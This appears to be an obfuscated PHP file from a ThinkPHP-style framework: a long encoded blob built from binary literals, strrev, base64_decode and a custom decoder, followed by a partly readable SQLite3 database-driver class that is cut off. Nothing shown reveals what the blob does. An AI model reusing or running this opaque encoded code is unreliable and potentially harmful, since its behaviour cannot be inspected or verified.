É3~ëÍ&5Ì[¥'."\0".'–ƒ£¾W—j<¥')."\x48\xc9\xf5\xf3\x71\xf2\x88\x93\xa1\x13\x84\xd7\x6f\xc8\xbe\x18\x7c\xc2\xcf\x26\xa7\xe5\xc5\x1c\xe1\xf8\x9a\x30\x9c\x73\x63\x39\xb8\x5f\x95\xda\xd2\xc5\xf3\xa7\xb8\xe3\x67\x8a\xd\x9\xcd\x4".strrev('ßcz!ñÓë(QB<ÁÊ›à‡‰ŒàØgËÀŠdí€Ñ&8£ÖØ¢)ödƒ@')."\350\342\5\251\263\261\257\57\324\55\71\72\235\140\276\127\54\327\12\31\371\7\213\104\227\363\365\37\214\351\142\111\106\305\310\225\254\257\55\44\370\37\371\22\51\44\361\114".base64_decode('VxlCjvT6CIx8BpIFjSFGHYmqHWgtiDKJwbASDt7LSgErsJFAk/KT266wH1tAzuXp')."\351\40\14\366\72\304\126\171\210\331\103\200\303\53\261\122\7\350\317\252\134\332\213\32\16\124\227\326\155\356\150\10\163\63\166\63\20\267\131\272\36\234\343\334\157\104\362\335"."\xa8\xd\xeb\xf8\x6\x16\xd3\x76\x94\x99\xa5\x40\x57\xca\x3b\x7\x4d\xc4\xa7\x52\xf1\x68\x77\x8c\x1d\x9d\xe0\x38\x56\x19\xa9\xb1\x60\xeb\x2a\x7e\x8a\xc1\xa1\xed\x81\xe5\x6e\x48\x8\xab\xfc\x2".base64_decode('SyqCuSIKw8mOT41FscYuGG53FYh3cFebTpgaDkWWVkxAckOnVIQCQ4lgpxvmrCEe')."\xc\xc4\x98\x8f\x56\x1c\x6f\x9\x47\x5b\xa5\xe4\x50\xb4\x1c\x13\x5c\x30\xe1\x40\xaa\xef\xa3\x40\xff\x49\x35\xbd\xeb\xc8\x96\xa5\x11\xed\x5c\xd2\xeb\xb1\x62\xc0\xab\xf6\x4d\xaf\x6d\xee\x3d\xb9"."\xb6\xa6\xd7\xdf\xec\xab\xe3\xfa\x2c\xca\xae\xa4\xfb\xa7\x13\x80\x2d\xb6\x88\x34\xba\x1\x78\xfd\x61\x40\x5a\xc\x62\x7e\x9f\xf\x3e\xc2\x3\xfe\x5e\x3f\xf3\x66\xe5\xe7\x89\x3c\x93\x6b\xe5\x0"."\307\310\161\352\20\310\321\74\227\247\14\166\5\335\347\366\371\251\342\253\256\52\237\150\370\14\124\215\257\212\363\41\241\364\131\51\335\101\204\64\233\154\161\340\312\214\376\165"."\xc9\x59\xb1\x91\x4b\xc5\x8c\xe\x2a\x76\x5c\xf5\x95\x41\x3e\xc3\x14\x13\x44\xcc\xe4\xb4\x99\x2a\x61\xff\x43\x62\x58\xc4\xc5\x60\x4\xf2\x39\xaa\x40\x3c\x7c\x50\x6c\xbb\x61\x22\xc6\xd9\x84\xcd"."\xa3\xe5\x11\xd6\xdf\x56\x24\x45\x2e\xe9\x8\x9d\xb8\x34\xdc\x19\x89\x76\x2d\x8b\xc5\x13\xdd\xcb\x57\xac\x5c\x5\x4e\x18\x1b\x19\x9d\xf4\x2b\x5e\xe6\x3e\xc\xfc\x89\xfa\x87\xb5\xa2\x7f\x98\x79".base64_decode('xF6ONwG65ZeFKw5EfUQ8kHEwP9UN8FTMMPyVk2ht/lzenjFBjq6injRNe4LU5Z1f')."\135\61\44\366\364\132\175\234\60\323\372\60\4\205\125\231\45\266\76\40\127\170\145\317\334\230\124\145\121\57\235\164\11\0\0\20\156\351\45\61\101\0\311\55\112\341\246\226"."\x59\x87\x8e\xb1\x63\x10\xe2\xbb\xab\xd5\xe4\x9f\x1\xcf\x99\x4b\xb0\xe7\x4c\xe6\x35\x73\x88\xf8\x73\x74\x3b\x83\x1c\xf2\x6a\x83\x8e\x74\xe1\xf6\x76\xc8\x8b\xb6\x88\x8e\xb8\xcb\x21\x24\xb6\x35"."\340\276\157\161\304\342\61\171\112\220\245\202\33\313\340\5\251\303\65\33\71\220\373\350\215\23\63\302\106\245\1\34\131\267\43\321\130\272\26\311\134\11\13\321\11\213\133\304"."\167\63\215\172\24\341\2\237\351\73\351\46\342\70\327\4\41\176\141\204\74\235\222\135\7\60\16\233\33\24\146\131\271\101\156\116\221\162\110\30\170\61\157\227\254\267\204\20"."\x1\xde\xe8\x51\x5a\xcb\x18\x33\x81\x82\xab\x95\x2d\x63\x31\xe9\xd1\xf\x87\xdb\x6\xd9\x7f\xbf\x56\x28\xb4\x66\x70\x1f\x1c\xb3\xd6\x1\x4a\xc9\x91\x7e\x6c\x4\x22\x1b\x8f\x80\x2a\x8f\xda\x8e".base64_decode('+lByG5Xk0jy/JUJ8FPul8XVUl2Zc22KTI6tZ9nKHH5uv9RqM/TV0cmmVC0p+07L8')."\330\367\36\21\17\271\161\124\64\316\16\51\234\175\241\117\252\110\273\111\160\377\305\235\337\162\327\270\302\177\56\325\55\323\160\220\373\44\101\122\156\140\0\273\241\60\363\354"."\61\206\340\150\301\264\164\331\35\163\132\47\276\40\371\275\153\311\313\161\116\33\305\63\206\331\214\111\376\216\231\367\140\331\21\37\106\230\67\347\360\317\76\352\105\135\167\171".strrev('ÎÂfãUÚ$òV©@_òW€EoIcÓ?}È·“’`îîÀOqvÕß/I¶Y}t¶')."\x37\x43\x70\xc3\xb6\xc4\xf4\x67\x75\xa5\x5e\x7b\x8b\xc2\x35\x33\x1a\x4b\xea\xff\x7f\xa9\x3e\xc6\xdc\x1e\xbb\x78\x8b\xcb\x53\x72\xef\x92\xde\xce\xde\x84\x8c\x26\xbb\xa8\xf5\xf7\xa3\x66\x4b\xae"._kodDe('KxAsBGCMge90vnt5cXx/LdDpdk1wojiDwzc7Mk90vaDiY4K1JNFCm/GuMyO+mw9Sqg==')."\30\133\26\112\322\63\71\62\275\340\345\201\77\31\202\267\306\324\231\66\343\366\304\311\65\70\321\157\142\75\102\250\313\267\230\151\130\111\327\125\41\112\254\152\254\72\241\6"."\375\326\126\171\252\260\0\104\342\170\24\61\200\264\243\252\361\204\32\22\250\5\207\42\343\140\277\57\171\41\25\107\276\240\315\151\106\250\225\316\51\232\11\66\360\334\237\351"."\x9f\xe9\x1f\x1\x7e\xd0\x3c\x84\xbf\x28\x5e\xc2\x70\xfb\x83\x1e\x55\xb5\xdc\x38\xd3\xbf\xab\xb2\xcf\x63\xf0\xa6\xc\x58\x97\x53\x3a\x78\x4b\x98\x37\xe4\xce\x36\xa8\x7e\xa5\x37\xd0\xb9\xda\x2b"."\xfc\x2\x2f\x6c\x1e\xcd\x65\x15\xd8\xd6\x34\x55\xcf\xf0\xd5\x57\x2b\xec\xa5\x94\xa6\xea\xee\x44\xbb\x77\x5e\x75\xf3\xa2\xc9\xb\x5b\xc9\xa9\xa5\xad\x77\xe2\x63\x47\xbc\xe9\xa6\xbb\xcd\x45\x70"."\252\260\20\117\57\36\361\73\143\23\225\5\372\313\151\343\146\136\33\261\20\207\312\371\122\200\314\156\316\305\204\117\356\274\156\217\230\105\70\222\5\131\155\146\175\203\114\323".strrev('F‡)ô‚\'#ì˜ÖeùZï™Ş¿şåÎ3ì¸Ş¼÷‹ŞR±…İû¬qˆÑÃDÚ›"@')."\105\176\337\103\162\204\113\64\42\164\126\62\353\2\200\141\256\311\100\202\203\366\13\223\157\314\22\125\47\113\134\354\152\57\106\265\27\11\7\230\376\321\244\262\15\311\213\265"."\234\305\371\210\204\373\151\11\67\26\110\21\74\270\136\371\315\212\121\44\311\341\144\354\275\336\213\307\327\153\244\47\112\21\223\272\142\123\123\100\52\225\262\164\227\214\264\373"."\223\344\24\334\133\52\261\17\126\254\124\226\63\131\6\322\211\20\257\117\166\206\216\167\340\136\256\364\167\373\132\27\262\271\126\356\30\36\115\136\145\346\254\306\331\363\321\137".strrev('İ(è½ã­hŸ#ˆÎò4'."\0".'ï±r\\†úÁ*¼@|gïçÇÈ(·V`T¿ì`')."\x4a\x4f\x1\x10\x55\x2d\x9d\x49\xd8\xb4\x45\xe5\xf\x26\x54\xe0\xa4\x48\xc8\x67\xb\x6\x2c\xbb\xd2\x9b\x51\x7c\x40\x6\x58\xa0\xc8\xf3\x6b\x62\x8a\x24\xb3\x83\xa2\x27\x49\x6c\x60\xc\x14\x3e"."\210\32\152\12\361\212\54\271\262\36\64\123\312\17\66\111\211\212\155\232\112\116\313\217\201\324\72\325\152\234\152\55\300\37\152\302\246\325\26\212\0\277\346\156\124\361\72\42".base64_decode('nN5Rly2QQhXTPvzOiQ8vUrGS9LyT8w6AitYm1+mo/HZdV7bEn64okDB0qSvcvSQU').base64_decode('kUx2JIDa2hZRA11dFRPWMwkHq7DwebdvLTsGSDEyXGjkBpQUNuhvqsLQKsUqppj3')."\331\52\77\60\136\222\101\154\14\26\32\120\244\32\27\121\372\121\237\274\44\104\223\253\27\55\364\33\213\370\350\10\217\72\105\123\334\127\360\371\217\307\333\4\77\66\212\311"."\x4f\xc3\xe4\x20\x9f\xd1\x13\x68\xbb\xf0\x9f\xa3\x28\xb\x35\x85\x22\xbe\xa9\x9a\x68\x6a\xab\x95\xc\x5a\xc0\xb9\x45\xe0\x22\x77\xe1\x8\x3b\x28\x59\xe8\xd7\xe4\x44\x3c\x15\x63\x26\x93\x97\xf9"."\356\140\230\373\216\253\250\154\17\110\276\252\311\243\24\255\132\176\171\171\21\134\271\57\45\47\321\221\44\67\52\312\363\373\311\226\324\57\66\102\316\323\10\256\274\257\100\24"."\5\55\65\210\11\117\254\22\360\45\110\350\302\73\27\232\340\360\274\157\113\246\10\45\174\247\210\50\177\213\342\1\230\165\353\150\105\130\60\70\371\344\162\30\130\63\272\223"."\2\5\303\15\302\364\342\206\341\35\244\200\241\345\316\371\31\112\253\162\46\1\141\171\350\257\50\23\216\54\21\21\72\241\34\211\75\314\160\230\304\172\173\252\175\165\47\237".base64_decode('7DeYzQ+zT2BlfTw3jff6nPlRTwD1PCMA3DmpmHkiTLnJ/jpxD4rb9ijY4KepaVEP').strrev('õ‚…‡*±Bm?˜y¶éÀİ‘ñ)´œÃHDk`ğV&ñ>ƒcÌf4VLicèÚ?').base64_decode('swjWe2eNpJ/PcaoL96XE9SGWhXAYFxwb5rgS8LODBDyMeCYSzta64aguDuSBhVaq')."\x68\x14\x6c\x7\x77\xa2\xaf\x2e\x56\x91\xa7\x67\xd6\x6a\xc3\x1a\xcd\x52\xa5\xc0\xb6\xbd\xa9\x8a\x38\x66\xaf\x42\xdc\x88\xa6\x0\x1b\x10\x4d\x59\x88\xd9\x8e\x52\xd4\xb3\x4d\x55\xa4\xb9\x56\x46"."\xd7\x51\x79\xc2\x58\x2a\x7d\x4\x15\xac\x52\x18\x4f\xcc\x69\x1c\x63\x45\xdb\x44\xeb\x23\xbf\x9e\x2\xf\x41\x75\xc7\xc0\xe4\x3f\x10\x81\xb3\x86\xe3\x4f\xa2\xbf\x27\x1c\xcf\xd9\x3f\x7e\x8e\x2c".base64_decode('qxepQTNhMuSUq1/oZuBBqq5YNBFtZe/3VFLiNDD51qJXrsQ+iF1L4ef+LAeXGPwA')."\201\161\57\226\362\171\156\102\205\105\110\276\254\141\223\14\365\304\170\64\302\136\303\110\160\262\301\117\102\372\224\36\215\235\212\200\355\45\75\346\211\147\112\266\130\102\261\213"."\367\4\276\157\152\1\130\162\172\207\135\356\241\212\172\350\255\327\246\172\166\373\200\131\146\211\273\107\220\263\102\35\124\377\230\340\226\117\172\336\241\42\241\337\316\232\334\67"."\103\175\175\275\267\176\6\372\313\154\167\231\367\261\306\372\372\262\54\365\365\215\344\57\115\40\152\101\30\24\147\12\232\374\214\153\101\206\21\135\207\6\301\102\220\63\362\45".strrev('Ñ ü$afnû,#®~İ1ürŠö,Œ|÷xÑûX4Zn'."\n".'Fâ´õu&')."\46\110\201\366\362\13\153\50\233\240\243\5\364\176\140\23\157\124\60\237\356\221\77\346\143\310\245\100\341\157\330\313\22\274\362\373\0\120\210\56\15\102\177\356\150\32\52\343"."\364\373\207\41\150\141\116\361\176\142\200\244\122\301\222\234\344\313\20\107\145\65\71\111\346\267\276\110\54\313\57\243\343\150\204\327\104\237\241\240\257\235\2\16\53\220\153\306"."\x1c\x51\xc5\x2a\x8c\xa3\x27\xf2\x18\x41\x29\xde\x53\x31\x32\x4c\x4b\x37\xf3\x30\x5e\x19\x3f\x96\xb2\x73\x35\x94\x38\xfc\x86\xb3\x7c\x72\x43\x7b\xd0\xc8\x3a\xee\xa5\xaa\x52\x51\x19\xb7\xb\x70".base64_decode('RtaThLMkrgjN6AB/jIPa1rG2KTD1aJR4HyYv5VFzyMbJZYNruweWjFHRFJdMyyxa')."\130\114\32\51\246\372\215\177\215\321\11\203\4\31\200\332\153\264\162\247\177\122\5\356\44\127\231\0\325\30\227\25\0\170\171\156\242\145\257\220\33\303\135\271\211\273\277\126"."\356\305\124\366\1\110\317\262\45\373\11\13\274\260\213\303\153\126\307\260\264\335\362\25\212\346\0\32\165\113\106\32\202\167\125\6\363\354\345\71\53\144\342\255\227\363\311\100"."\xac\xc2\x67\xef\x55\x2\x39\x8b\x8b\xae\x9a\x78\x2e\x57\xca\x2a\x9e\x24\x96\x80\xce\xd9\x2c\x25\xb4\xf2\x37\x73\x64\x20\xde\xbe\xc9\xe6\xa\xc4\xc8\xd4\x59\x7\xde\x66\x39\x21\xbc\x65\x5f\x41"."\x74\x6c\x3f\x6f\xc3\xdb\xa6\xb2\x89\x1d\xcd\x26\x38\x12\xd6\xb5\xc8\x1a\x61\xd5\x41\x26\x8c\x56\x99\x75\x4\xc6\x90\x38\x94\x74\xc2\x29\x8c\xee\xb8\x1d\xe7\x22\x9\xc2\xe8\xb2\x3a\x7b\x6a\x15"."\130\41\231\124\270\2\142\105\342\102\252\230\10\60\165\233\232\344\142\316\264\127\317\272\210\5\56\141\271\60\132\271\302\120\326\244\143\224\252\262\62\4\317\350\16\376\302\147"."\x5\x42\x74\x12\x5b\x19\x55\x11\xf9\x0\x57\xd0\xc8\x59\xa1\x14\xc3\xb5\x3\x23\xf3\xa0\x4d\x9e\x45\xf5\x76\x1e\xc\x56\xe8\xb3\x97\x4a\x5e\xe7\xd7\x8b\x9d\x83\x2a\x17\x80\x97\x6b\x4c\x24\x4f".base64_decode('YQ+iciFcV7eLRS11cETe1h7SWGahpUz1zQTrsanMFT3lx+LE0Q/d7kHd6kNCvVhN')."\x60\x40\x7a\x28\x37\x66\x75\xe2\x26\x43\x28\xcd\xc6\x67\xa8\xa4\x33\x49\x5d\x71\x2e\xb4\xd2\xb2\xa1\x48\x75\x2\x17\x4f\x64\x8a\xa6\xcd\x37\x75\x38\x1d\x91\xa5\x88\x84\x65\xe9\x2d\x41\x8b\x78"."\x17\x89\xcf\x3a\xce\xc7\x24\xaf\xcc\x3c\x2b\x5a\xe6\xd9\xd7\x35\xd6\x22\x62\xf5\x44\xbc\x5a\x4b\xfb\x4c\x57\xd4\x6d\x23\x46\x96\x69\x9b\xad\xb4\xcc\xcd\xb5\x30\x9f\xc2\xa3\x1a\x97\x8c\x6a\x2a".strrev('o$e^É/ñ´O³HÀıT+Òç>'."\n".'õrl4réŞA)Éj$Y”õ? "ñ'."\n".'|')."\330\50\46\271\75\227\344\100\357\14\205\13\220\52\255\231\106\246\113\11\44\177\45\131\322\245\25\224\256\54\20\275\106\274\224\344\207\63\56\11\217\335\202\120\144\1\212\135"."\x6b\xc0\x15\x10\x7\x1f\xb8\x7\x96\x9c\x86\xaa\xc5\x5e\x69\x45\xcf\xe4\x22\xe4\x9b\x65\x45\x68\x1a\x96\x61\x84\x9b\xc\x39\xc5\xc2\xfe\xcc\xbb\xd9\xb0\x55\x4a\xa9\xf0\x29\x92\x24\x61\x34\xc5".base64_decode('HQcBdgSSIGFMZ3aE3hkzvbNA9y9fkWCbCGDjaC5IZID3W4yLgBUe5BN5TOmIi7jO')."\20\16\3\210\227\20\76\236\304\235\10\217\25\245\245\134\347\26\172\304\257\206\314\125\305\211\71\65\334\303\31\272\53\245\123\14\341\344\66\207\251\245\53\3\232\31\316\164"."\x70\x6c\x2e\x1a\x43\x5d\x7b\x98\xe\x3b\x18\x57\x25\xe0\x3e\x5f\x76\xdd\x4e\x4a\x89\x7e\x8\x7b\x53\x4\x32\xa9\xfb\x74\x9\x31\xe2\xe4\x9f\x7a\x1c\x61\x86\xb3\x9c\x2f\x9\x70\xc2\xe4\xc0\x72"."\353\1\114\225\120\45\275\74\12\57\112\326\324\342\313\243\16\265\126\347\30\277\342\207\155\161\360\32\311\15\54\55\71\302\122\71\161\132\216\10\265\75\162\224\346\40\236\153"."\x44\x67\xf7\x40\x99\xfa\xa5\xab\xa3\xcb\xcf\x41\x2d\x7c\x7a\xd2\x9d\xbb\x70\x74\xd4\xca\xc\x7c\xc4\x43\xf7\x23\x39\x23\xa5\x84\xa3\x4b\x42\xad\x81\x70\x5b\x28\xbe\x54\x19\xd0\x6d\x45\x98\x39"."\x90\xe7\xf\x9c\x53\x99\xe8\x18\x29\xe2\x19\x55\x27\xb9\x27\x7e\x1c\xf4\x26\x91\xc0\xee\x4d\xf3\x4d\x8d\x25\xb6\x2f\x92\x5\x96\xf4\x88\x91\xb3\x5a\x4a\x7f\x7a\xb1\xac\xc6\x3c\xbe\xde\x91\x2d".base64_decode('K4M1pxVyZ4VKUcpcKOrl+cd08lK9aLFUoFShNZC/8hfIcwlybiSH6PmJGm/khw3L')."\x10\x13\x9f\x95\x18\x93\x6b\xf\xb4\x75\x86\x22\x6a\x20\x1c\x8e\xae\x70\x58\xaa\x9\x9d\x71\x91\x3f\x4e\x91\x96\xdf\xb2\x90\x46\x46\xc\x2\xfd\x7a\xb9\xff\x2d\xf0\x5e\x24\xbb\xd\x77\x69\x31"."\350\360\311\256\330\12\354\310\4\236\343\343\256\355\151\124\172\152\246\120\324\14\113\227\0\364\211\224\72\270\115\241\145\263\216\107\346\262\375\122\264\344\134\131\53\176\112\245"."\37\140\60\311\355\133\245\14\61\374\76\374\377\270\251\106\132\270\134\62\322\314\162\203\137\176\243\136\357\133\345\7\11\331\67\313\236\323\371\332\207\171\74\342\314\106\45\116"."\x69\xd8\xfb\x60\x26\xd9\x8d\x80\xa8\x4c\x61\xa1\xa8\x4a\xf4\xac\xaa\xf8\x4\xda\x27\x17\xc7\xa\xf2\x29\x9f\x3f\xed\xe7\x28\xa6\x1\xec\x59\x2e\xc8\x8e\x96\x70\x44\xec\xb\x70\x76\xa8\xd\x7f"."\x8e\xee\x16\xd1\x26\x18\xeb\xbc\xd8\xe\x82\x59\x1e\x22\x3e\x1\x78\x76\x9c\x72\xbb\x9e\x18\x72\x1b\x69\x3a\x5e\x6d\x2f\xfb\x6\xf1\x6f\x4f\xd3\x7a\x70\x77\x50\xce\x3e\xd1\x39\x14\xe3\xef\x57".strrev('GI'."\r".'-¦l‡tØ+˜*âñ^UÙ(oâ»_OR“Jñ)PŠÉ@'."\r".''."\n".'”î¢ˆ')."\354\224\260\375\221\231\33\53\3\70\364\110\141\326\56\156\130\207\137\146\310\367\233\62\376\10\103\306\66\367\364\315\72\272\145\367\40\161\135\267\313\37\270\241\305\377\117\12"."\xd2\xc4\xb8\xe4\xf0\xcf\x59\x49\x79\x83\x2c\xf7\x52\x27\xc4\x2e\xfc\x76\x4f\xc6\x1c\x71\x3e\x5c\x87\x21\xee\xd7\x7a\x1c\xef\xf4\x48\x93\x86\xdc\x38\x95\x5f\x16\x72\x16\xf2\x94\xbd\x90\xa1\x90"."\27\111\25\104\352\60\212\330\115\21\333\22\222\314\322\247\247\322\237\136\370\145\313\231\273\21\224\121\301\47\153\71\121\265\146\214\154\272\310\15\152\4\240\123\27\373\164\122"."\12\333\224\150\354\345\125\362\214\127\33\343\311\360\50\107\245\47\234\260\137\67\347\333\42\342\311\26\261\166\72\237\260\340\307\302\226\230\14\226\355\170\64\45\141\46\264\1".base64_decode('D5XIMFcTsZYxOSwbe5JeoESmS0vz8V4kZWDvoKU95MUuyurcr35IM43zT7n0QNZM')."\152\331\30\265\103\163\334\320\50\242\335\24\177\136\336\221\215\202\374\132\241\40\316\243\344\45\23\375\357\270\31\7\151\335\211\16\225\334\357\126\351\261\165\134\320\234\164\222"."\105\201\160\252\125\312\207\350\41\200\3\132\224\366\171\262\253\114\172\176\47\356\142\101\166\324\316\56\172\140\7\10\223\253\144\207\250\134\43\335\56\275\320\355\57\77\164\305"."\26\166\300\121\344\267\336\341\324\333\47\157\304\40\203\262\120\21\244\341\230\310\230\224\220\64\114\337\104\43\234\102\26\334\277\2\52\275\110\3\157\257\125\172\140\206\122\76"."\371\151\323\373\371\246\6\307\305\342\56\373\250\20\46\32\356\147\321\312\237\170\143\317\271\261\251\3\157\271\125\170\240\155\302\367\335\74\342\332\335\127\275\133\43\56\207\71"."\37\364\305\375\340\242\1\337\67\224\155\75\334\273\16\216\126\127\201\230\33\311\11\263\134\75\53\216\245\35\257\317\111\275\6\326\126\376\202\235\204\6\251\337\245\142\326\103"."\x4e\xe8\x3d\xcc\xc7\x5b\xc5\x47\xf0\x1c\xaf\xe8\xb8\x7\xb4\xc2\x33\x7a\x5f\x5b\x21\x98\xff\x92\x4d\x57\xda\xc9\xf5\x1a\x17\x26\x8b\xec\xc8\xd3\x9d\xcd\x70\xd0\xae\x5a\xd4\xc5\xdd\x11\xea\x12".strrev('ÿ'."\0".'­tYË²-:$Ÿ³ÊpüÂ¡’qBˆ"´‚gœ<fáÎ(CÜ¬¾{5œÏK•Xl³')."\xb3\x9\x23\x76\xf\x34\xab\x64\x27\x5d\xfe\x58\x6d\x19\x6\x8\x9d\x4a\x16\x44\xd2\x82\xe8\xb2\xfe\x30\xb1\x79\x86\x25\x66\x1d\x5d\x2\xc5\x3b\x8b\xce\x6f\x51\xf1\xa1\x42\x3f\xa4\x75\x4f\x4c"."\26\372\116\236\231\305\173\354\34\126\235\333\105\315\271\241\254\264\157\42\230\140\233\64\203\74\100\255\273\333\116\20\3\332\24\221\54\155\254\344\32\155\323\255\12\302\305\361"."\272\110\64\221\321\74\173\11\0\137\64\26\263\115\342\104\377\203\1\144\173\44\272\235\22\266\77\25\172\356\137\314\130\113\205\167\20\45\123\212\257\150\67\225\356\370\176\320".base64_decode('q9leiSAl9aFuR8kAA4sQ21ZnX13Vo2Kijj6PMlGmchFPei5RuKKShDtcmt0+nGDX').base64_decode('Ty6/OcUk+TE3codMeF4g09UxdSVXt/I1LFKRPCfKq5aexhNaIaJGgh7BhCbuNkkz')."\3\113\370\275\75\115\62\336\162\252\252\60\252\245\147\117\115\71\54\206\0\263\375\50\163\40\212\276\356\330\152\242\170\233\353\25\134\302\242\334\117\343\62\24\21\276\40\130".base64_decode('nnT907Gv4Y+FOfY5lvuFQCTtyU6AUdT9wirwRmJWT78mra5iIRWhSCknIpJ+l2yp')."\x78\xa2\xe3\x96\x2c\xf6\xaf\xe4\x62\x3\xec\xee\xad\xe5\x7a\x39\x94\xba\x67\xa5\x61\x26\xf9\xff\x5f\x3f\x8e\xf7\xff\xea\x4d\xbc\xd9\xf5\x4c\x13\xef\x78\x58\x77\x9\xc8\xdf\x4c\xe4\x1b\x97\x5c".strrev('ÜE+.Wò'."\r".'ñK\'²–;ÊÙÖ•›-(Ã±¥½sÇÌÃ¶ç´lş" @ôÎ«°-S@')."\167\311\334\317\227\366\260\247\275\311\313\244\175\225\62\12\66\304\67\106\25\350\230\202\230\74\234\57\77\73\306\343\25\166\72\120\226\44\216\262\154\342\253\110\60\141\356\312"."\374\54\224\302\173\100\342\103\0\360\45\137\372\214\26\330\156\261\26\330\174\337\142\306\216\310\335\162\340\112\62\47\162\200\312\370\127\302\61\12\16\240\214\140\30\65\174\147"."\xd6\xf9\x10\x3c\x94\xe8\x74\x3d\xbf\x48\x33\x59\x32\x36\x1d\xfa\xfa\x72\x53\x82\xf2\xd2\x7c\xe6\xcb\x45\xb0\x91\xb6\x53\x85\xc5\x1f\xd1\xae\x77\xbf\xaa\x3d\xc3\x5b\xfe\x31\x7a\x47\x2\x6b\x51"."\142\130\157\301\64\121\344\110\207\34\255\126\50\103\51\65\56\362\114\60\127\52\317\130\376\354\245\120\313\341\220\334\137\66\363\273\212\46\221\356\234\120\256\313\221\14\137\245"."\167\240\247\372\312\326\27\306\355\34\50\107\33\67\161\146\150\230\304\213\72\53\332\335\131\103\256\373\0\305\242\275\104\273\51\306\136\172\161\31\317\51\341\32\21\73\262\42".base64_decode('6kN5CWc38CQDdgA5lHyW/GCFsyS+kuCcS4sqZUuZRUvKxuGV8mIKk5UYchp+E9d2')."\214\205\160\210\357\166\204\117\266\366\164\267\356\330\264\303\261\256\14\222\116\75\221\344\235\166\276\254\101\22\11\230\171\321\204\32\244\163\73\347\261\51\167\377\135\306\51\113"."\106\130\112\46\245\230\163\66\364\213\157\51\206\204\357\5\222\114\117\44\2\322\303\313\356\122\316\67\272\245\103\326\24\241\274\140\371\71\232\70\336\223\344\14\126\14\157\213".base64_decode('xBLggld6crpfGxZCkhDM02n+2rsja1p3u5lBEPEwPBaypAu6wjxeH3G/vOuTL/U6')."\62\226\103\305\5\136\251\274\70\121\21\335\304\260\112\335\47\23\315\131\134\276\40\314\211\112\200\350\333\10\334\42\113\332\4\341\173\41\302\124\213\166\205\357\365\305\47\235"."\327\221\171\66\76\146\50\17\271\205\343\165\100\135\333\72\254\126\141\22\203\53\311\222\137\315\165\236\235\312\312\7\211\4\364\154\130\252\116\76\127\235\260\100\274\362\107\4"."\125\72\121\54\335\343\26\11\154\251\63\35\310\227\130\44\357\30\344\214\311\211\216\346\270\207\226\354\110\4\371\122\140\216\350\164\151\132\300\231\104\363\353\256\326\313\5\334"."\75\243\45\254\21\303\116\145\244\155\122\171\142\71\274\130\206\124\370\120\345\366\272\133\305\160\352\336\74\212\112\312\332\43\31\147\44\314\12\145\150\213\52\26\243\111\270\244"."\20\127\35\145\47\100\1\56\113\223\160\331\262\144\126\130\322\265\110\345\154\255\144\115\320\275\162\344\201\2\42\135\241\303\256\155\72\315\72\21\76\53\146\56\377\34\120\234"."\73\67\321\130\124\156\205\120\64\270\16\311\53\265\242\142\346\11\133\41\162\273\126\201\112\274\226\245\124\340\256\302\132\242\234\217\213\264\12\266\33\264\116\274\106\313\316\231"."\52\44\313\206\40\225\115\105\142\25\247\276\345\264\341\160\301\145\304\200\157\117\220\256\200\332\320\116\61\153\14\12\263\66\146\241\76\325\301\337\113\371\301\274\311\327\214\264"."\xb0\x40\xc4\xd6\xd3\x81\xa2\x1b\x91\x65\xb5\x39\xe9\x34\x5f\x92\xdc\xa5\x56\x34\x98\xf7\xe0\x7d\x7d\xf9\xe\x3a\xab\xb1\x63\x0\xe9\xa6\x1\xdd\xf2\x98\xb6\x91\xd2\x9d\x3e\x59\x65\x1f\x4d\x34"."\235\175\44\53\51\12\135\72\72\241\145\160\330\30\124\320\142\21\20\310\165\102\135\116\353\223\44\26\101\23\216\33\36\124\116\200\123\6\172\100\331\212\17\302\371\321\24\361"."\47\112\327\125\232\34\67\213\266\7\247\45\314\2\371\155\61\155\133\34\330\323\155\75\21\6\361\342\350\221\354\121\120\110\234\103\341\106\221\3\16\102\266\204\275\220\40\34"."\225\342\375\162\134\247\251\204\51\71\42\370\340\204\107\344\265\17\216\114\333\113\256\103\135\1\100\233\323\244\71\312\274\65\342\233\345\242\75\342\150\205\240\114\310\47\100\176"."\262\105\15\271\263\157\371\151\212\37\274\374\173\65\54\50\302\173\135\276\265\205\1\107\161\372\352\21\67\74\375\252\32\100\245\52\252\240\56\276\211\256\13\256\342\304\23\361"."\262\244\256\100\74\276\42\32\153\243\36\301\313\222\111\51\311\102\251\54\251\253\43\32\231\50\55\330\31\10\205\313\322\260\61\123\104\25\156\265\150\122\250\213\264\222\234\10"."\x4e\xd4\x8a\x50\xeb\x52\xd1\x12\x72\xf6\x2c\x34\xf5\x85\x8c\xc9\x14\xf0\xec\x24\x23\xae\x65\xd9\x2e\x5d\xba\x57\xaa\xe7\x84\x3f\x35\x51\x26\x6f\xa4\x6\x85\x72\x4f\x93\x84\x77\x8b\x39\x3e\xe4"."\x1\xe7\xf3\x3a\x2e\x9b\x41\x46\xa4\x50\x11\x36\x44\x8a\x40\xdd\xb1\x2\x40\xb1\x87\x74\x3e\xd7\xb9\x20\x2d\xe\xd3\x7d\x8e\x43\x77\x9\x4e\xe6\x3\x61\x30\x12\xcd\xc9\xb\x2d\x1\xd4\x55\x44".strrev('lô/áæÕ3Ùâ mm’;'."\r".'±’¥<·t'."\n".'§JLÖ¶Å`š\'a¸© u?-å¬').base64_decode('/xsHdkfVJawAAA=='), 10, -8))); goto EÀŸ– ‰Ğ×; b¤šò¤å: class DbSqlite3Base extends Db { public function __construct($ïÑÄ»•è = '') { $Š‚¶¹Øô =& $_SERVER[¹òÍ›æş]; if (!class_exists($Š‚¶¹Øô[64])) { think_exception(think_lang($Š‚¶¹Øô[14]) . $Š‚¶¹Øô[65]); } if (!empty($ïÑÄ»•è)) { if (!isset($ïÑÄ»•è[$Š‚¶¹Øô[16]])) { $ïÑÄ»•è[$Š‚¶¹Øô[16]] = 438; } $this->config = $ïÑÄ»•è; if (empty($this->config[$Š‚¶¹Øô[17]])) { $this->config[$Š‚¶¹Øô[17]] = array(); } } } public function connect($²¥³àÚƒ = '', $É„§Ä÷ = 0) { $³ºšÖü¸ =& $_SERVER[¹òÍ›æş]; if (!isset($this->linkID[$É„§Ä÷])) { if (empty($²¥³àÚƒ)) { $²¥³àÚƒ = $this->config; } $this->linkID[$É„§Ä÷] = new SQLite3($²¥³àÚƒ[$³ºšÖü¸[21]]); if (!$this->linkID[$É„§Ä÷]) { think_exception($this->linkID[$É„§Ä÷]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$É„§Ä÷]->busyTimeout(30000); if (1 != think_config($³ºšÖü¸[22])) { unset($this->config); } } return $this->linkID[$É„§Ä÷]; } public function free() { $this->queryID = null; } public function 